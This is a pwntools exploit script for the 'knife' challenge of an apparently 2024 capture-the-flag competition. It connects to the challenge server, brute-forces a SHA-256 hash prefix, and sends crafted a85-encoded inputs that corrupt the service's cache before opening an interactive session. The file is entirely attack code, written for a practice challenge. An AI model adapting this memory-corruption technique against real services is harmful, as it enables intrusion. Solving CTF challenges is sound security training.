from hashlib import sha256
from pwn import *


context.arch = "amd64"
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]
# context.terminal = ["tmux", "neww"]

r = lambda x: p.recv(x)
ra = lambda: p.recvall()
rl = lambda: p.recvline(keepends=True)
ru = lambda x: p.recvuntil(x, drop=True)
sa = lambda x, y: p.sendafter(x, y)
sl = lambda x: p.sendline(x)
sla = lambda x, y: p.sendlineafter(x, y)

HOST = "knife.2024.ctfcompetition.com"
PORT = 1337
LOCAL = False
elf = ELF("./chal")
libc = elf.libc

if LOCAL:
    # p = process(elf.file.name)
    # gdb.attach(p, """
    #         """)
    p = gdb.debug(elf.file.name, """
            c
            """)
else:
    context.log_level = "info"
    p = remote(HOST, PORT)

def sha256_collision():
    # Find a collision
    i = 0
    while True:
        sha = sha256(str(i).encode()).hexdigest()
        if sha.startswith("a85"):
            return i, sha
        i += 1

def cmd(decoder, encoder, text):
    cmds = ["plain", "hex", "a85"]
    sla(b"Awaiting command...\n", f"{cmds[decoder]} {cmds[encoder]} {text}".encode())

# Exploit starts here
val, sha = sha256_collision()
# Found a collision: 2015, hash: a85e9db4851f7cd3efb8db7bf69a07cfb97bc528b72785a9cff7bdfef7e2279d

# Fill the cache
for i in range(8):
    cmd(0, 0, str(i))

# In a85 encoding
x = "cS5p|"
xxxx = "teAzc"

# OBW the cache
for i in range(6):
    command = f"{sha[3:]}AAAA" + i * xxxx + x + (8 - i) * xxxx
    print(command)
    cmd(2, 0, command)

cmd(0, 0, val)

p.interactive()
